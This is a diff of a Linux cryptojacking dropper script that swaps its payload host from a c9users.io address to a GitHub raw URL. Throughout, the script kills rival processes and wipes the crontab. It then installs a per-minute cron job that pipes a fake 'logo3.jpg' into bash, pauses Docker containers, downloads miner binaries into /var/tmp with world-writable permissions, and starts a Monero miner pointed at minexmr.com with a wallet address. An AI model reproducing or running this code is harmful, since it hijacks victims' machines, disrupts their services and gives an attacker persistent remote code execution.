@@ -84,13 +84,13 @@ ps auxf|grep -v grep|grep "ysjswirmrm"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "snapd"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "mysql_dump"|awk '{print $2}'|xargs kill -9
 crontab -r || true && \
-echo "* * * * * curl -s http://redmine-ant0ni024.c9users.io/m/logo3.jpg | bash -s" >> /tmp/cron || true && \
+echo "* * * * * curl -s https://raw.githubusercontent.com/Antonio24/redmine2/master/m/logo3.jpg | bash -s" >> /tmp/cron || true && \
 crontab /tmp/cron || true && \
 rm -rf /tmp/cron || true && \
 docker pause `docker ps|grep kube-apis |awk '{print $1}'`
 docker pause `docker ps|grep nginx78 |awk '{print $1}'`
-curl -o /var/tmp/config.json http://redmine-ant0ni024.c9users.io/m/config_1.json
-curl -o /var/tmp/jvs http://redmine-ant0ni024.c9users.io/m/gcc
+curl -o /var/tmp/config.json https://raw.githubusercontent.com/Antonio24/redmine2/master/m/config_1.json
+curl -o /var/tmp/jvs https://raw.githubusercontent.com/Antonio24/redmine2/master/m/gcc
 chmod 777 /var/tmp/jvs
 cd /var/tmp
 proc=`grep -c ^processor /proc/cpuinfo`
@@ -104,8 +104,8 @@ if [ $? -eq 0 ]
 then
 pwd
 else
-curl -o /var/tmp/config.json http://redmine-ant0ni024.c9users.io/m/c1.json
-curl -o /var/tmp/jvs http://redmine-ant0ni024.c9users.io/m/minerd
+curl -o /var/tmp/config.json https://raw.githubusercontent.com/Antonio24/redmine2/master/m/c1.json
+curl -o /var/tmp/jvs https://raw.githubusercontent.com/Antonio24/redmine2/master/m/minerd
 chmod 777 /var/tmp/jvs
 cd /var/tmp
 proc=`grep -c ^processor /proc/cpuinfo`
@@ -118,8 +118,8 @@ if [ $? -eq 0 ]
 then
 pwd
 else
-curl -o /var/tmp/config.json http://redmine-ant0ni024.c9users.io/m/kworker.json
-curl -o /var/tmp/jvs http://redmine-ant0ni024.c9users.io/m/atd2
+curl -o /var/tmp/config.json https://raw.githubusercontent.com/Antonio24/redmine2/master/m/kworker.json
+curl -o /var/tmp/jvs https://raw.githubusercontent.com/Antonio24/redmine2/master/m/atd2
 chmod 777 /var/tmp/jvs
 cd /var/tmp
 proc=`grep -c ^processor /proc/cpuinfo`
@@ -132,8 +132,8 @@ if [ $? -eq 0 ]
 then
 pwd
 else
-curl -o /var/tmp/config.json http://redmine-ant0ni024.c9users.io/m/kworker.json
-curl -o /var/tmp/jvs http://redmine-ant0ni024.c9users.io/m/atd3
+curl -o /var/tmp/config.json https://raw.githubusercontent.com/Antonio24/redmine2/master/m/kworker.json
+curl -o /var/tmp/jvs https://raw.githubusercontent.com/Antonio24/redmine2/master/m/atd3
 chmod 777 /var/tmp/jvs
 cd /var/tmp
 proc=`grep -c ^processor /proc/cpuinfo`
@@ -147,7 +147,7 @@ if [ $? -eq 0 ]
 then
 pwd
 else
-curl -o /var/tmp/jvs http://redmine-ant0ni024.c9users.io/m/yam
+curl -o /var/tmp/jvs https://raw.githubusercontent.com/Antonio24/redmine2/master/m/yam
 chmod 777 /var/tmp/jvs
 cd /var/tmp
 nohup ./jvs -c x -M stratum+tcp://48kZyLJp4UP7JAvtA3qxo1KX2S6UabBtLJvjS5zYwKRz33HWBSKxwAD8VVzLP5REYbjZWXPHf1mFVBVCsNNWUqtzBt8qAo7:x@pool.minexmr.com:3333/xmr  >/dev/null &
